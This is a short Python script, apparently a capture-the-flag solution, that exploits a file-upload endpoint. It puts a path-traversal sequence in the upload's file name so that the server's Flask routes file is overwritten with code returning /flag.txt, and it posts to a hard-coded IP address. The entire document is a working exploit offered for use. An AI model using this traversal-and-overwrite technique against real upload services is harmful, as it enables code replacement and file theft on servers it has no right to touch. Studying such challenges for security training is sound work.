import requests

payload = b"""
from flask import Blueprint
web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
    return open('/flag.txt').read()
"""

files = {
    'file': ('../../../../app/application/blueprints/routes.py', payload)
}

res = requests.post('http://134.209.175.6:32214/api/upload', files=files)
print(res.text)

# Now visit http://target:1337/

